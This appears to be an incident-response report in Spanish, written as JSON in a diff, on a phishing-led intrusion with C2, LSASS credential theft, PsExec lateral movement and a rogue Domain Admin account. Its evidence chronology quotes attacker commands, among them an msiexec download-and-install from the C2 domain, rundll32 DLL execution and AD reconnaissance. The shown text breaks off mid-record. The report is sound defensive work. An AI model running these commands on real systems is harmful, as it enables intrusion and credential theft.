@@ -1,0 +1,6450 @@
+{
+  "informe": {
+    "incident_id": "INC-20261009-011790",
+    "title": "Intrusión por Phishing, Dump de LSASS, Movimiento Lateral PsExec y Creación de Cuenta Privilegiada",
+    "alert_ids": [
+      "ALR-20261009-011790",
+      "ALR-20261009-011791",
+      "ALR-20261009-011792",
+      "ALR-20261009-011793",
+      "ALR-20261010-011794",
+      "ALR-20261010-011795",
+      "ALR-20261010-011796",
+      "ALR-20261010-011797",
+      "ALR-20261010-011798",
+      "ALR-20261018-011895",
+      "ALR-20261018-011896"
+    ],
+    "related_incidents": [],
+    "patient_zero": "marta.puig",
+    "initial_access": "Recepción y apertura por parte de marta.puig del correo de spear-phishing (EML-0062206) suplantando al proveedor Hilaturas Alcoi con el adjunto 'Pedido_Q4_2026.zip', dentro del cual se ejecutó el script 'Pedido_Q4_2026.js'.",
+    "timeline": [
+      {
+        "timestamp": "2026-10-09T09:04:00.000Z",
+        "event_id": "EML-0062206",
+        "description": "Entrega de correo de spear-phishing a marta.puig suplantando al proveedor Hilaturas Alcoi con adjunto malicioso Pedido_Q4_2026.zip.",
+        "mitre": "T1566.001"
+      },
+      {
+        "timestamp": "2026-10-09T09:27:00.000Z",
+        "event_id": "EDR-0123400",
+        "description": "Ejecución del script Pedido_Q4_2026.js mediante wscript.exe en el puesto WS-BCN-1770.",
+        "mitre": "T1204.002"
+      },
+      {
+        "timestamp": "2026-10-09T09:27:06.000Z",
+        "event_id": "EDR-0123401",
+        "description": "Ejecución de msiexec.exe para descargar la carga útil upd.msi desde el dominio malicioso aplihartom.com.",
+        "mitre": "T1204.002"
+      },
+      {
+        "timestamp": "2026-10-09T09:27:30.000Z",
+        "event_id": "EDR-0123402",
+        "description": "Creación del archivo DLL malicioso upd_x64.dll en la carpeta AppData de la usuaria.",
+        "mitre": "T1204.002"
+      },
+      {
+        "timestamp": "2026-10-09T09:27:34.000Z",
+        "event_id": "EDR-0123403",
+        "description": "Carga y ejecución de upd_x64.dll mediante rundll32.exe.",
+        "mitre": "T1204.002"
+      },
+      {
+        "timestamp": "2026-10-09T09:27:40.000Z",
+        "event_id": "EDR-0123404",
+        "description": "Creación de clave de persistencia en el registro de Windows (HKCU Run key Update).",
+        "mitre": "T1204.002"
+      },
+      {
+        "timestamp": "2026-10-09T09:27:59.000Z",
+        "event_id": "DNS-0191506",
+        "description": "Resolución DNS del dominio de C2 aplihartom.com hacia la IP 203.0.113.88.",
+        "mitre": "T1071"
+      },
+      {
+        "timestamp": "2026-10-09T09:28:00.000Z",
+        "event_id": "PRX-0211359",
+        "description": "Establecimiento de tráfico de C2 beaconing mediante peticiones HTTP POST a aplihartom.com.",
+        "mitre": "T1071.001"
+      },
+      {
+        "timestamp": "2026-10-09T13:02:00.000Z",
+        "event_id": "FW-0025180",
+        "description": "Conexión saliente de C2 Cobalt Strike directa a la IP 107.174.115.43 por el puerto 443.",
+        "mitre": "T1071"
+      },
+      {
+        "timestamp": "2026-10-10T00:13:00.000Z",
+        "event_id": "EDR-0123405",
+        "description": "Reconocimiento local del sistema ejecutando whoami /all en WS-BCN-1770.",
+        "mitre": "T1087.002"
+      },
+      {
+        "timestamp": "2026-10-10T00:13:09.000Z",
+        "event_id": "EDR-0123406",
+        "description": "Enumeración del grupo privilegiado Domain Admins mediante net group.",
+        "mitre": "T1087.002"
+      },
+      {
+        "timestamp": "2026-10-10T00:13:18.000Z",
+        "event_id": "EDR-0123407",
+        "description": "Identificación de controladores de dominio utilizando la utilidad nltest.",
+        "mitre": "T1087.002"
+      },
+      {
+        "timestamp": "2026-10-10T00:13:45.000Z",
+        "event_id": "EDR-0123410",
+        "description": "Ejecución de la herramienta AdFind (adf.exe) para enumerar equipos en el Active Directory.",
+        "mitre": "T1087.002"
+      },
+      {
+        "timestamp": "2026-10-10T00:22:00.000Z",
+        "event_id": "EDR-0123412",
+        "description": "Extracción de credenciales de LSASS mediante comsvcs.dll MiniDump, comprometiendo la cuenta privilegiada adm.aortega.",
+        "mitre": "T1003.001"
+      },
+      {
+        "timestamp": "2026-10-10T00:28:00.000Z",
+        "event_id": "FW-0025181",
+        "description": "Inicio de escaneo interno de puertos desde WS-BCN-1770 hacia la subred de servidores.",
+        "mitre": "T1046"
+      },
+      {
+        "timestamp": "2026-10-10T00:40:00.000Z",
+        "event_id": "FW-0025321",
+        "description": "Conexión SMB hacia el servidor de archivos FS01 por el puerto 445.",
+        "mitre": "T1021.002"
+      },
+      {
+        "timestamp": "2026-10-10T00:40:04.000Z",
+        "event_id": "EDR-0123413",
+        "description": "Movimiento lateral e instalación del servicio remoto PSEXESVC en FS01 utilizando la cuenta adm.aortega.",
+        "mitre": "T1021.002"
+      },
+      {
+        "timestamp": "2026-10-10T00:40:09.000Z",
+        "event_id": "EDR-0123414",
+        "description": "Ejecución del binario no firmado svchelper.exe en el servidor de archivos FS01.",
+        "mitre": "T1021.002"
+      },
+      {
+        "timestamp": "2026-10-10T00:51:06.000Z",
+        "event_id": "EDR-0123435",
+        "description": "Movimiento lateral al servidor PRINT01 y ejecución del binario malicioso spoolhlp.exe.",
+        "mitre": ""
+      },
+      {
+        "timestamp": "2026-10-10T00:56:00.000Z",
+        "event_id": "FW-0026543",
+        "description": "Conexión saliente de C2 desde PRINT01 hacia la IP 107.174.115.43:443.",
+        "mitre": "T1071"
+      },
+      {
+        "timestamp": "2026-10-10T01:05:00.000Z",
+        "event_id": "EDR-0123415",
+        "description": "Intento de eliminación de instantáneas de volumen (Shadow Copies) mediante vssadmin.exe en FS01 (bloqueado por EDR).",
+        "mitre": "T1490"
+      },
+      {
+        "timestamp": "2026-10-10T01:05:05.000Z",
+        "event_id": "EDR-0123416",
+        "description": "Intento de borrado del catálogo de copias de seguridad mediante wbadmin.exe en FS01.",
+        "mitre": "T1490"
+      },
+      {
+        "timestamp": "2026-10-18T01:12:00.000Z",
+        "event_id": "ADE-0000570",
+        "description": "Creación de la cuenta ilegítima de usuario svc_print_upd con contraseña sin caducidad en PRINT01.",
+        "mitre": "T1098"
+      },
+      {
+        "timestamp": "2026-10-18T01:13:00.000Z",
+        "event_id": "ADE-0000571",
+        "description": "Elevación de privilegios agregando la cuenta svc_print_upd al grupo Domain Admins usando adm.aortega.",
+        "mitre": "T1098"
+      },
+      {
+        "timestamp": "2026-10-18T01:18:00.000Z",
+        "event_id": "EDR-0123436",
+        "description": "Detención intencionada del servicio del agente EDR (EDRAgentSvc) en el servidor PRINT01.",
+        "mitre": "T1562.001"
+      }
+    ],
+    "scope": {
+      "users": [
+        "marta.puig",
+        "adm.aortega",
+        "svc_print_upd"
+      ],
+      "hosts": [
+        "WS-BCN-1770",
+        "FS01",
+        "PRINT01"
+      ],
+      "data": "No consta exfiltración de datos personales ni tablas SQL de clientes (~274 KB de tráfico C2 saliente registrado).",
+      "business_impact": "Sin interrupción operativa de la venta online ni del centro logístico, pero con un compromiso grave de la seguridad del Active Directory debido al robo de credenciales de Domain Admin y a intentos bloqueados de destrucción de backups."
+    },
+    "root_cause": "La pasarela de correo entregó un mensaje de spear-phishing suplantado con un adjunto comprimido (.zip) que contenía un archivo ejecutable (.js) a pesar de fallar la autenticación SPF/DMARC. La ausencia de políticas de restricción de ejecución de scripts (como AppLocker/WDAC) en puesto de trabajo permitió ejecutar JavaScript y descargar cargas útiles maliciosas. Asimismo, la presencia de credenciales privilegiadas (adm.aortega) cacheadas en la memoria LSASS de un puesto no administrativo (incumpliendo la política de uso exclusivo desde JUMP01) facilitó el movimiento lateral a servidores y la escalada a Domain Admin.",
+    "containment_plan": [
+      {
+        "action": "isolate_host",
+        "target": "WS-BCN-1770",
+        "approver": "N2",
+        "business_impact": "Pérdida de conectividad en el puesto de trabajo de la usuaria de compras.",
+        "justification": "Aislar el puesto cliente donde se inició el compromiso y la comunicación C2."
+      },
+      {
+        "action": "isolate_host",
+        "target": "PRINT01",
+        "approver": "N2 + responsable del servicio: SIN RESPONSABLE en servicios_negocio.csv",
+        "business_impact": "Indisponibilidad temporal de servidor de impresión.",
+        "justification": "Aislar el servidor comprometido donde se detuvo el agente EDR y se creó la cuenta maliciosa de Domain Admin."
+      },
+      {
+        "action": "isolate_host",
+        "target": "FS01",
+        "approver": "N2 + responsable del servicio: SIN RESPONSABLE en servicios_negocio.csv",
+        "business_impact": "Corte temporal de acceso a recursos compartidos de archivos.",
+        "justification": "Aislar el servidor de archivos donde se intentó la eliminación de instantáneas de volumen para ransomware."
+      },
+      {
+        "action": "disable_user",
+        "target": "svc_print_upd",
+        "approver": "N2",
+        "business_impact": "ninguno",
+        "justification": "Inhabilitar la cuenta ilegítima con privilegios de Domain Admin creada por el atacante."
+      },
+      {
+        "action": "disable_user",
+        "target": "adm.aortega",
+        "approver": "N2",
+        "business_impact": "Pérdida temporal de acceso administrativo de la usuaria Alba Ortega.",
+        "justification": "Inhabilitar la cuenta privilegia adm.aortega tras la extracción de credenciales de LSASS."
+      },
+      {
+        "action": "reset_password",
+        "target": "adm.aortega",
+        "approver": "N2",
+        "business_impact": "ninguno",
+        "justification": "Forzar cambio de clave de la cuenta privileged comprometida."
+      },
+      {
+        "action": "revoke_sessions",
+        "target": "adm.aortega",
+        "approver": "N2",
+        "business_impact": "ninguno",
+        "justification": "Invalidar tokens y sesiones Kerberos activas de la cuenta adm.aortega."
+      },
+      {
+        "action": "revoke_sessions",
+        "target": "marta.puig",
+        "approver": "N2",
+        "business_impact": "Desconexión temporal de la usuaria marta.puig.",
+        "justification": "Invalidar sesiones activas de la usuaria afectada por phishing."
+      },
+      {
+        "action": "reset_password",
+        "target": "marta.puig",
+        "approver": "N2",
+        "business_impact": "ninguno",
+        "justification": "Cambio preventivo de credenciales de marta.puig."
+      },
+      {
+        "action": "block_ioc",
+        "target": "aplihartom.com",
+        "approver": "—",
+        "business_impact": "ninguno",
+        "justification": "Bloquear el dominio C2 en proxy, cortafuegos y DNS."
+      },
+      {
+        "action": "block_ioc",
+        "target": "107.174.115.43",
+        "approver": "—",
+        "business_impact": "ninguno",
+        "justification": "Bloquear la IP de infraestructura C2 en el cortafuegos perimetral."
+      },
+      {
+        "action": "block_ioc",
+        "target": "203.0.113.88",
+        "approver": "—",
+        "business_impact": "ninguno",
+        "justification": "Bloquear la IP de resolución C2 en la infraestructura de red."
+      },
+      {
+        "action": "block_ioc",
+        "target": "70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44",
+        "approver": "—",
+        "business_impact": "ninguno",
+        "justification": "Bloquear el hash de los payloads svchelper.exe/spoolhlp.exe en EDR."
+      },
+      {
+        "action": "purge_email",
+        "target": "<20261009110402.4411@pedidos-hilaturas-alcoi.example>",
+        "approver": "—",
+        "business_impact": "ninguno",
+        "justification": "Purgar el mensaje de phishing y su adjunto malicioso de todos los buzones."
+      },
+      {
+        "action": "block_ioc",
+        "target": "0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+        "approver": "—",
+        "business_impact": "",
+        "justification": "Indicador malicioso según sandbox"
+      },
+      {
+        "action": "block_ioc",
+        "target": "3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768",
+        "approver": "—",
+        "business_impact": "",
+        "justification": "Indicador malicioso según sandbox"
+      },
+      {
+        "action": "block_ioc",
+        "target": "6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+        "approver": "—",
+        "business_impact": "",
+        "justification": "Indicador malicioso según sandbox"
+      }
+    ],
+    "eradication_and_recovery": [
+      "Reinstalación y formateo limpio del puesto de trabajo infectado WS-BCN-1770.",
+      "Restauración y reactivación del servicio del agente EDR (EDRAgentSvc) en PRINT01 tras limpieza de archivos maliciosos (spoolhlp.exe).",
+      "Eliminación definitiva de la cuenta ilegítima de usuario svc_print_upd del Active Directory.",
+      "Eliminación de la clave de registro de persistencia (HKCU\\...\\Run\\Update) y eliminación de artefactos maliciosos (upd_x64.dll, svchelper.exe, spoolhlp.exe).",
+      "Restablecimiento de credenciales de adm.aortega y marta.puig, revocando todos los tickets Kerberos y tokens de sesión.",
+      "Verificación de integridad de las instantáneas y copias de seguridad en FS01 tras la tentativa fallida de borrado con vssadmin/wbadmin."
+    ],
+    "notifications": [
+      "DPO y Departamento Legal para valoración de notificación preventiva a la AEPD en el plazo de 72 horas por riesgo de impacto sobre infraestructura y credenciales de la red corporativa.",
+      "Responsable del SOC y CISO (Alba Rovira) de acuerdo con los SLAs para incidentes de severidad Crítica/Alta.",
+      "Notificación al proveedor legítimo Hilaturas Alcoi para informarle de la suplantación de su dominio/identidad de correo en ataques de phishing."
+    ],
+    "detection_gaps": [
+      "Hueco en DNS: No existe regla en el SIEM para alertar sobre solicitudes DNS reiteradas a dominios de C2/IOCs de reciente creación (53 resolución de aplihartom.com sin alerta directa).",
+      "Hueco en Firewall: Ausencia de alertas por tráfico de salida continuado desde servidores internos (PRINT01) hacia IPs C2 de alta sospecha (49 conexiones a 107.174.115.43 sin alerta dedicada).",
+      "Hueco en EDR: Falta de firmas o reglas heurísticas para bloquear la creación/ejecución de ejecutable no firmado en carpetas del sistema (C:\\Windows\\Temp\\spoolhlp.exe) con el mismo hash que artefactos detectados en otros equipos.",
+      "Hueco en Pasarela de Correo: El filtro de correo entregó un adjunto .zip con script ejecutable (.js) pese a que la verificación SPF/DMARC del emisor falló (softfail/fail). Ajustar políticas para bloquear o enviar a cuarentena mensajes con fallos DMARC y adjuntos de script."
+    ],
+    "confidence": 0.95,
+    "open_questions": [
+      "Confirmar si existieron otros puestos de trabajo que recibieran el mismo mensaje de phishing antes de proceder a la purga global de buzones.",
+      "Verificar si se realizaron accesos adicionales no registrados utilizando la cuenta privilegiada adm.aortega durante la ventana de tiempo del compromiso."
+    ],
+    "descartados": [
+      {
+        "event_id": "SIGN-0014615",
+        "motivo": "Inicio de sesión legítimo de marta.puig desde dispositivo móvil previo al phishing; no relacionado con la ejecución de malware en WS-BCN-1770."
+      },
+      {
+        "event_id": "EDR-0123429",
+        "motivo": "Instalación de agente de monitorización realizada por adm.dnavarro desde JUMP01 correspondiente al cambio aprobado CHG-2026-1057."
+      },
+      {
+        "event_id": "EDR-0123430",
+        "motivo": "Instalación de agente de monitorización realizada por adm.dnavarro desde JUMP01 correspondiente al cambio aprobado CHG-2026-1057."
+      },
+      {
+        "event_id": "EDR-0123431",
+        "motivo": "Instalación de agente de monitorización realizada por adm.dnavarro desde JUMP01 correspondiente al cambio aprobado CHG-2026-1057."
+      },
+      {
+        "event_id": "EDR-0123432",
+        "motivo": "Instalación de agente de monitorización realizada por adm.dnavarro desde JUMP01 correspondiente al cambio aprobado CHG-2026-1057."
+      }
+    ],
+    "ajustes_politica": [
+      "isolate_host WS-BCN-1770: requiere aprobación de N2",
+      "isolate_host PRINT01: requiere aprobación de N2 + responsable del servicio: SIN RESPONSABLE en servicios_negocio.csv",
+      "isolate_host FS01: requiere aprobación de N2 + responsable del servicio: SIN RESPONSABLE en servicios_negocio.csv",
+      "Añadido block_ioc 0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697: malicioso según sandbox",
+      "Añadido block_ioc 3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768: malicioso según sandbox",
+      "Añadido block_ioc 6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466: malicioso según sandbox"
+    ]
+  },
+  "hechos": {
+    "alert_ids": [
+      "ALR-20261009-011790",
+      "ALR-20261009-011791",
+      "ALR-20261009-011792",
+      "ALR-20261009-011793",
+      "ALR-20261010-011794",
+      "ALR-20261010-011795",
+      "ALR-20261010-011796",
+      "ALR-20261010-011797",
+      "ALR-20261010-011798",
+      "ALR-20261018-011895",
+      "ALR-20261018-011896"
+    ],
+    "ventana": {
+      "desde": "2026-10-02T09:08:48Z",
+      "hasta": "2026-10-21T01:22:06Z"
+    },
+    "entidades": {
+      "ip:81.28.167.30": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1,
+        "notables": 0
+      },
+      "host:WS-BCN-1770": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1583,
+        "notables": 0
+      },
+      "hash:3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1,
+        "notables": 0
+      },
+      "ip:203.0.113.88": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1296,
+        "notables": 0
+      },
+      "hash:70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 2,
+        "notables": 1
+      },
+      "user:marta.puig": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1525,
+        "notables": 1
+      },
+      "ip:107.174.115.43": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 50,
+        "notables": 49
+      },
+      "host:FS01": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 326,
+        "notables": 0
+      },
+      "dom:aplihartom.com": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1297,
+        "notables": 1286
+      },
+      "user:adm.aortega": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 8,
+        "notables": 0
+      },
+      "hash:0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1,
+        "notables": 0
+      },
+      "hash:6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 1,
+        "notables": 0
+      },
+      "user:svc_print_upd": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 2,
+        "notables": 0
+      },
+      "host:PRINT01": {
+        "salto": 0,
+        "via": "alerta",
+        "eventos": 6,
+        "notables": 1
+      },
+      "ip:198.18.46.40": {
+        "salto": 1,
+        "via": "user:marta.puig",
+        "eventos": 1,
+        "notables": 0
+      },
+      "user:adm.dnavarro": {
+        "salto": 1,
+        "via": "host:PRINT01",
+        "eventos": 4,
+        "notables": 3
+      },
+      "host:JUMP01": {
+        "salto": 1,
+        "via": "host:PRINT01",
+        "eventos": 102,
+        "notables": 0
+      },
+      "host:ERP-APP01": {
+        "salto": 2,
+        "via": "user:adm.dnavarro",
+        "eventos": 1,
+        "notables": 0
+      },
+      "host:HR-APP01": {
+        "salto": 2,
+        "via": "user:adm.dnavarro",
+        "eventos": 96,
+        "notables": 0
+      }
+    },
+    "concentradores": [
+      "host:CRM-APP01"
+    ],
+    "iocs": [
+      "dom:aplihartom.com",
+      "hash:0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+      "hash:3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768",
+      "hash:6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+      "hash:70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44",
+      "ip:107.174.115.43",
+      "ip:203.0.113.88",
+      "ip:81.28.167.30"
+    ],
+    "cronologia": [
+      {
+        "timestamp": "2026-10-08T10:52:43.215Z",
+        "event_id": "SIGN-0014615",
+        "source": "idp_signins",
+        "nivel": "pivote",
+        "description": "Inicio de sesión de marta.puig@tarvia.example en Office 365 Exchange Online: success (MFA push/satisfied_by_session) desde 198.18.46.40 FR AS8075",
+        "mitre": "T1078",
+        "senales": [
+          "origen_nuevo: marta.puig usada por primera vez desde 198.18.46.40 FR (habitual: 198.18.200.10, 37 usos)"
+        ],
+        "entidades": [
+          "ip:198.18.46.40",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:04:00.000Z",
+        "event_id": "EML-0062206",
+        "source": "email",
+        "nivel": "núcleo",
+        "description": "Correo de pedidos@pedidos-hilaturas-alcoi.example a marta.puig@tarvia.example: «RE: Pedido Q4 2026 - confirmación de cantidades» [Pedido_Q4_2026.zip]",
+        "mitre": "T1566.001",
+        "senales": [
+          "alerta: citado por ALR-20261009-011790",
+          "ioc: indicador del ataque: 3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768, 6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+          "raro: poco común en la empresa: pedidos-hilaturas-alcoi.example",
+          "operacion: email/inbound/suspicious (1 en 4 semanas)"
+        ],
+        "entidades": [
+          "dom:pedidos-hilaturas-alcoi.example",
+          "hash:3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768",
+          "hash:6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+          "msg:<20261009110402.4411@pedidos-hilaturas-alcoi.example>",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:27:00.000Z",
+        "event_id": "EDR-0123400",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · wscript.exe \"wscript.exe\" \"C:\\Users\\marta.puig\\Downloads\\Pedido_Q4_2026\\Pedido_Q4_2026.js\"",
+        "mitre": "T1204.002",
+        "senales": [
+          "alerta: citado por ALR-20261009-011791",
+          "raro: poco común en la empresa: ff0b946ebe8dc45dca38173f2fd0592722be06322236d3acf3fc743eb9c51853"
+        ],
+        "entidades": [
+          "hash:ff0b946ebe8dc45dca38173f2fd0592722be06322236d3acf3fc743eb9c51853",
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:27:06.000Z",
+        "event_id": "EDR-0123401",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · msiexec.exe msiexec.exe /q /i https://aplihartom.com/dl/upd.msi",
+        "mitre": "T1204.002",
+        "senales": [
+          "alerta: citado por ALR-20261009-011791",
+          "raro: poco común en la empresa: 521bce57f7fe9fda56ead8d729484e134a4a1a73fec8c867698ea297a4df72e3"
+        ],
+        "entidades": [
+          "hash:521bce57f7fe9fda56ead8d729484e134a4a1a73fec8c867698ea297a4df72e3",
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:27:30.000Z",
+        "event_id": "EDR-0123402",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · file_create · TARVIA\\marta.puig · msiexec.exe {\"file_path\": \"C:\\\\Users\\\\marta.puig\\\\AppData\\\\Roaming\\\\Custom_update\\\\upd_x64.dll\"}",
+        "mitre": "T1204.002",
+        "senales": [
+          "alerta: citado por ALR-20261009-011791",
+          "ioc: indicador del ataque: 0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+          "operacion: edr_events/file_create (2 en 4 semanas)"
+        ],
+        "entidades": [
+          "hash:0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:27:34.000Z",
+        "event_id": "EDR-0123403",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · rundll32.exe rundll32.exe \"C:\\Users\\marta.puig\\AppData\\Roaming\\Custom_update\\upd_x64.dll\",homq",
+        "mitre": "T1204.002",
+        "senales": [
+          "alerta: citado por ALR-20261009-011791"
+        ],
+        "entidades": [
+          "hash:9dd6d63b39062871d97565ca7a98d52dc8c329cc61ec22c27295aab29d646243",
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:27:40.000Z",
+        "event_id": "EDR-0123404",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · registry_set · TARVIA\\marta.puig · rundll32.exe {\"key\": \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Update\", \"value\": \"rundll32.exe \\\"C:\\\\Users\\\\marta.pui",
+        "mitre": "T1204.002",
+        "senales": [
+          "alerta: citado por ALR-20261009-011791",
+          "operacion: edr_events/registry_set (2 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:27:59.000Z",
+        "event_id": "DNS-0191506",
+        "source": "dns",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 resuelve aplihartom.com → 203.0.113.88  (×53 hasta 2026-10-10T05:43)",
+        "mitre": "T1071",
+        "senales": [
+          "ioc: indicador del ataque: 203.0.113.88, aplihartom.com"
+        ],
+        "entidades": [
+          "dom:aplihartom.com",
+          "host:WS-BCN-1770",
+          "ip:203.0.113.88"
+        ],
+        "repeticiones": 53,
+        "hasta": "2026-10-10T05:43:27.000Z",
+        "event_ids": [
+          "DNS-0191506",
+          "DNS-0191507",
+          "DNS-0191508",
+          "DNS-0191509",
+          "DNS-0191510"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T09:28:00.000Z",
+        "event_id": "PRX-0211359",
+        "source": "proxy",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 (marta.puig) → POST https://aplihartom.com/live/ [allowed, 231 B salida]  (×1243 hasta 2026-10-10T05:59)",
+        "mitre": "T1071.001",
+        "senales": [
+          "alerta: citado por ALR-20261009-011792",
+          "ioc: indicador del ataque: 203.0.113.88, aplihartom.com"
+        ],
+        "entidades": [
+          "dom:aplihartom.com",
+          "host:WS-BCN-1770",
+          "ip:203.0.113.88",
+          "user:marta.puig"
+        ],
+        "repeticiones": 1243,
+        "hasta": "2026-10-10T05:59:26.000Z",
+        "event_ids": [
+          "PRX-0211359",
+          "PRX-0211360",
+          "PRX-0211361",
+          "PRX-0211362",
+          "PRX-0211363"
+        ]
+      },
+      {
+        "timestamp": "2026-10-09T13:02:00.000Z",
+        "event_id": "FW-0025180",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 107.174.115.43:443 allow (48211 B, OUTBOUND-WEB)",
+        "mitre": "T1071",
+        "senales": [
+          "alerta: citado por ALR-20261009-011793",
+          "ioc: indicador del ataque: 107.174.115.43"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "ip:107.174.115.43"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:13:00.000Z",
+        "event_id": "EDR-0123405",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · whoami.exe whoami /all",
+        "mitre": "T1087.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011794"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:13:09.000Z",
+        "event_id": "EDR-0123406",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · net.exe net group \"Domain Admins\" /domain",
+        "mitre": "T1087.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011794"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:13:18.000Z",
+        "event_id": "EDR-0123407",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · nltest.exe nltest /dclist:tarvia.local",
+        "mitre": "T1087.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011794"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:13:27.000Z",
+        "event_id": "EDR-0123408",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · net.exe net view /all /domain",
+        "mitre": "T1087.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011794"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:13:36.000Z",
+        "event_id": "EDR-0123409",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · net.exe net share",
+        "mitre": "T1087.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011794"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:13:45.000Z",
+        "event_id": "EDR-0123410",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · adf.exe C:\\ProgramData\\adf.exe -f \\\"(objectcategory=computer)\\\" -csv name operatingSystem",
+        "mitre": "T1087.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011794"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:13:54.000Z",
+        "event_id": "EDR-0123411",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · TARVIA\\marta.puig · net.exe net group \"Enterprise Admins\" /domain",
+        "mitre": "T1087.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011794"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770",
+          "user:marta.puig"
+        ]
+      },
+      {
